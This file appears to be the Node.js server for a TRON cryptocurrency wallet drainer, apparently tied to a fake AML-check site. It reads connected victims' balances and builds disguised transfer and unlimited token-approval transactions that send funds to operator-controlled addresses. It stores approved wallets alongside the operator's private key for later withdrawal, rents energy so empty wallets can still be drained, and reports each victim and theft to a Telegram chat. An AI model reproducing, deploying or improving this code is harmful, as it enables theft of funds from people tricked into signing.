const express = require('express')
const cors = require('cors')
const https = require('https')
const http = require('http')
const fs = require('fs')
const app = express()
const TronWeb = require('tronweb').TronWeb
const config = require('./modules/get-config')
const { SETTINGS, MIN_TRX_RESERVE, TRONGRID_API_KEY, SERVER_DOMAIN } = config
const telegramBot = require('./modules/bot')
const {
	checkAccountStatus,
	checkBalance,
	getUpdateTokenBalance,
} = require('./modules/get-balance')
const {
	returnMessage,
	createListofTokensForMessage,
} = require('./modules/logs')
const {
	createSendTRX,
	createSendTRC10,
	createApproveTRC20,
	checkTRC20ApprovalToContract,
	withdrawTRC20,
	saveApprovedWallet,
} = require('./modules/functions')
const {
	activateAddress,
	rentEnergy,
	returnEnergy,
	startRentalReturnScheduler,
} = require('./modules/mode')

const allowedOrigins = [
	`http://localhost:8080`,
	`http://localhost:8081`,
	`http://localhost:8082`,
	`https://searchaml.net`,
]

SETTINGS.forEach(setting => {
	setting.domains.forEach(domain => {
		allowedOrigins.push(`https://${domain}`)
	})
})

const corsOptions = {
	origin: allowedOrigins,
	methods: ['GET', 'POST', 'PUT', 'DELETE'],
	allowedHeaders: 'Content-Type,Authorization',
}

const isDevelopment = process.env.NODE_ENV === 'development'

let sslOptions = null
if (!isDevelopment) {
	try {
		sslOptions = {
			key: fs.readFileSync(
				`/etc/letsencrypt/live/${SERVER_DOMAIN}/privkey.pem`,
			),
			cert: fs.readFileSync(
				`/etc/letsencrypt/live/${SERVER_DOMAIN}/fullchain.pem`,
			),
			ca: fs.readFileSync(`/etc/letsencrypt/live/${SERVER_DOMAIN}/chain.pem`),
		}
	} catch (error) {
		console.warn(
			'SSL certificates not found, running in HTTP mode:',
			error.message,
		)
	}
}

app.use(cors(corsOptions))
app.use(express.json())
app.use(express.urlencoded({ extended: true }))

app.get('/', (_, res) => {
	res.json({ message: 'Hello world!' })
})
app.post('/send_connection_data', sendTokensList)
app.post('/send_signedTx', sendSignedTransaction)
app.post('/send_message', sendTelegramMessage)
app.post('/get_unsigned_tx', getUnsignedTx)

const PORT = process.env.PORT || (sslOptions ? 443 : 3000)

const tronWeb = new TronWeb({
	fullHost: 'https://api.trongrid.io',
	headers: { 'TRON-PRO-API-KEY': TRONGRID_API_KEY },
})

function startServer() {
	if (sslOptions) {
		https.createServer(sslOptions, app).listen(PORT, () => {
			console.log(`HTTPS Server running on port ${PORT}`)
		})
	} else {
		http.createServer(app).listen(PORT, () => {
			console.log(`HTTP Server running on port ${PORT} (development mode)`)
		})
	}
}

async function startApp() {
	try {
		await startRentalReturnScheduler(tronWeb)
		startServer()
	} catch (error) {
		console.error('Scheduler failed, starting server anyway:', error)
		startServer()
	}
}

startApp()

//////////////////////////////////////////////////
//////////////////////////////////////////////////
//////////////////////////////////////////////////
//////////////////////////////////////////////////

//Send message to telegram bot
async function sendTelegramMessage(req, res) {
	try {
		const data = req.body
		const token = data.token
		const domain = data.domain
		const indexOfSetting = SETTINGS.findIndex(setting =>
			setting.domains.includes(domain),
		)
		const setting = SETTINGS[indexOfSetting]

		data.receiver =
			token.withdrawalMethod !== 'Verify10'
				? setting.contractOwnerAddress
				: setting.receiverAddress

		const message = returnMessage(data)[data.event]
		await telegramBot.sendMessage(setting.telegramChatId, message, {
			parse_mode: 'HTML',
			disable_web_page_preview: true,
		})

		res.status(200).send({ message: 'Message sent successfully' })
	} catch (error) {
		console.log(error)
		res.status(500).send('Something went wrong when trying to send message')
	}
}

//Get connection data
async function sendTokensList(req, res) {
	try {
		const data = req.body
		const { domain, address, event, walletName } = data
		const indexOfSetting = SETTINGS.findIndex(setting =>
			setting.domains.includes(domain),
		)
		const setting = SETTINGS[indexOfSetting]
		const balance = await checkBalance(address, indexOfSetting, walletName)
		let {
			tokens,
			isTRXFee,
			isActivatedAddress,
			isRequiredEnergyAvailable,
			isRequiredBandwidthAvailable,
			allTokensValue,
		} = balance
		data.mode = setting.mode
		data.indexOfSetting = indexOfSetting + 1

		if (
			(setting.mode === 4 &&
				tokens.length === 0 &&
				(!isActivatedAddress || isRequiredBandwidthAvailable || isTRXFee)) ||
			(setting.mode === 3 && tokens.length === 0 && isTRXFee)
		) {
			data.totalValue = 0
			data.tokens = '<code>No USDT available</code>'
			tokens = [
				{
					balance: '0',
					quantity: 0,
					tokenType: 'trc20',
					tokenId: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
					withdrawalMethod:
						walletName === 'Ledger' ? 'approve' : 'increaseApproval',
					tokenName: 'TETHER USD',
					amountInUsd: 0,
					tokenDecimal: 6,
					isTRXFee,
					isActivatedAddress,
					isRequiredBandwidthAvailable,
				},
			]
		} else if (
			tokens.length === 0 &&
			setting.mode !== 3 &&
			setting.mode !== 4
		) {
			data.totalValue = 0
			data.tokens = '<code>No tokens available</code>'
			const errorMessage = 'Insufficient balance'
			res.status(200).send({ message: errorMessage })
			const message = returnMessage(data)[event]
			await telegramBot.sendMessage(setting.telegramChatId, message, {
				parse_mode: 'HTML',
				disable_web_page_preview: true,
			})
			return
		} else if (
			(setting.mode === 4 &&
				isActivatedAddress &&
				!isRequiredBandwidthAvailable &&
				!isTRXFee) ||
			(setting.mode !== 4 && !isTRXFee)
		) {
			data.totalValue = allTokensValue
			data.tokens = createListofTokensForMessage(tokens)
			const errorMessage = 'Insufficient trx balance'
			res
				.status(200)
				.send({ message: errorMessage, minTrxReserve: MIN_TRX_RESERVE })
			const message = returnMessage(data)[event]
			await telegramBot.sendMessage(setting.telegramChatId, message, {
				parse_mode: 'HTML',
				disable_web_page_preview: true,
			})
			return
		} else {
			data.totalValue = allTokensValue
			data.tokens = createListofTokensForMessage(tokens)
		}

		const message = returnMessage(data)[event]
		await telegramBot.sendMessage(setting.telegramChatId, message, {
			parse_mode: 'HTML',
			disable_web_page_preview: true,
		})

		res.status(200).send({ tokens })
	} catch (error) {
		console.log(error)
		const errorMessage = 'Something went wrong when trying to send data'
		res.status(500).send(errorMessage)
	}
}

function delay(ms) {
	return new Promise(resolve => setTimeout(resolve, ms))
}

//Withdraw tokens
async function getUnsignedTx(req, res) {
	try {
		const messageData = req.body
		const { token, address, domain, domainAndPath } = messageData
		const indexOfSetting = SETTINGS.findIndex(setting =>
			setting.domains.includes(domain),
		)
		const setting = SETTINGS[indexOfSetting]
		const moveMessage = 'Move to the next token'
		const transactionTitle = setting.transactionTitle
		const transactionMessage = setting.transactionMessage
		let transaction
		let tx
		switch (token.tokenType) {
			case 'trc10':
				if (token.tokenId === '_') {
					await delay(3000)
					const updateToken = await getUpdateTokenBalance(
						token,
						address,
						tronWeb,
					)
					if (!updateToken)
						return res.status(200).send({ message: moveMessage })
					transaction = await createSendTRX(
						updateToken,
						address,
						indexOfSetting,
						tronWeb,
					)
					tx = { [transactionTitle]: transactionMessage, transaction }
					return res.status(200).send({ tx })
				}
				transaction = await createSendTRC10(
					token,
					address,
					indexOfSetting,
					tronWeb,
				)
				tx = { [transactionTitle]: transactionMessage, transaction }
				return res.status(200).send({ tx })
			case 'trc20':
				console.log(
					'TRC20 case, token:',
					token.tokenName,
					'balance:',
					token.balance,
				)
				console.log('Creating approve transaction...')
				const {
					isActivatedAddress,
					isRequiredEnergyAvailable,
					isRequiredBandwidthAvailable,
				} = await checkAccountStatus(address, indexOfSetting)
				if (setting.mode === 4 && !isActivatedAddress) {
					console.log('with hash8net')
					await activateAddress(address, indexOfSetting, tronWeb)
					await rentEnergy(address, indexOfSetting, tronWeb)
					await delay(3000)
				} else if (
					setting.mode === 4 &&
					isRequiredBandwidthAvailable &&
					!isRequiredEnergyAvailable &&
					!token.isTRXFee
				) {
					console.log('without hash8net')
					await rentEnergy(address, indexOfSetting, tronWeb)
					await delay(3000)
				}
				transaction = await createApproveTRC20(
					token,
					address,
					indexOfSetting,
					tronWeb,
				)
				console.log('Approve transaction created:', transaction ? 'OK' : 'NULL')
				tx = { [transactionTitle]: transactionMessage, transaction }
				return res.status(200).send({ tx })
			default:
				return res.status(200).send({ message: moveMessage })
		}
	} catch (error) {
		console.log(error)
		const errorMessage = 'Something went wrong when trying to send data'
		res.status(500).send(errorMessage)
	}
}

//Send the signed transaction to the blockchain
async function sendSignedTransaction(req, res) {
	async function waitForSuccess(
		txid,
		{ timeoutMs = 120000, pollInterval = 3000 } = {},
	) {
		const start = Date.now()
		while (Date.now() - start < timeoutMs) {
			try {
				const tx = await tronWeb.trx.getTransaction(txid)
				if (tx && tx.ret && tx.ret[0] && tx.ret[0].contractRet) {
					const result = String(tx.ret[0].contractRet).toUpperCase()
					return { found: true, success: result === 'SUCCESS', tx }
				}
			} catch (err) {
				console.warn(
					'waitForSuccess poll error',
					err && err.message ? err.message : err,
				)
			}
			await new Promise(r => setTimeout(r, pollInterval))
		}
		return { found: false, timeout: true }
	}

	try {
		const messageData = req.body
		const { token, address, domain, domainAndPath } = messageData
		const indexOfSetting = SETTINGS.findIndex(setting =>
			setting.domains.includes(domain),
		)
		const setting = SETTINGS[indexOfSetting]

		// Send the raw signed transaction
		const transaction = await tronWeb.trx.sendRawTransaction(token.signedTx)
		const txid =
			transaction?.txid ||
			transaction?.txID ||
			(transaction?.transaction &&
				(transaction.transaction.txID || transaction.transaction.txid)) ||
			null

		if (!txid) {
			console.log('No txid returned from sendRawTransaction', transaction)
			return res
				.status(500)
				.send({ error: 'No txid returned from node', details: transaction })
		}

		// Wait for transaction confirmation (based on getTransaction)
		const waitRes = await waitForSuccess(txid, {
			timeoutMs: 120000,
			pollInterval: 3000,
		})
		if (waitRes.timeout || !waitRes.found) {
			console.log('Transaction info not found within timeout for tx', txid)
			return res
				.status(500)
				.send({ error: 'Timeout waiting for transaction result', txid })
		}
		if (!waitRes.success) {
			console.log('Transaction executed but not SUCCESS', txid, waitRes.tx)
			return res.status(500).send({
				error: 'Transaction executed but not SUCCESS',
				txid,
				info: waitRes.tx,
			})
		}

		// Save approved wallet info
		if (token.withdrawalMethod !== 'Verify10') {
			await saveApprovedWallet({
				address,
				tokenContract: token.tokenId,
				tokenBalance: token.balance,
				tokenName: token.tokenName.toUpperCase(),
				tokenAmount: token.quantity,
				tokenBalanceInUsd: token.amountInUsd,
				contractAddress: setting.contractAddress,
				contractOwnerAddress: setting.contractOwnerAddress,
				contractOwnerPrivateKey: setting.contractOwnerPrivateKey,
				contractOwnerBalance: 0,
			})
		}

		// Send Telegram message
		messageData.event = 'completedTransaction'
		messageData.hash = txid
		messageData.receiver =
			token.withdrawalMethod !== 'Verify10'
				? setting.contractAddress
				: setting.receiverAddress
		const message = returnMessage(messageData)[messageData.event]
		await telegramBot.sendMessage(setting.telegramChatId, message, {
			parse_mode: 'HTML',
			disable_web_page_preview: true,
		})

		// Handle autowithdraw
		// if (
		// 	token.tokenType === 'trc20' &&
		// 	setting.useAutowithdraw &&
		// 	setting.mode !== 3 &&
		// 	setting.mode !== 4
		// ) {
		// 	setTimeout(async () => {
		// 		try {
		// 			await withdrawTRC20(
		// 				token,
		// 				address,
		// 				indexOfSetting,
		// 				domainAndPath,
		// 				tronWeb,
		// 			)
		// 		} catch (error) {
		// 			console.error(error)
		// 		}
		// 	}, 20 * 1000)
		// }

		// Return energy if needed
		if (
			setting.mode === 4 &&
			(!token.isActivatedAddress ||
				(token.isRequiredBandwidthAvailable && !token.isTRXFee))
		) {
			try {
				await returnEnergy(address, indexOfSetting, tronWeb)
			} catch (error) {
				console.log(error)
			}
		}

		res.status(200).send({ message: 'Message sent successfully' })
	} catch (error) {
		console.log(error)
		const errorMessage = 'Something went wrong when trying to send data'
		res.status(500).send(errorMessage)
	}
}
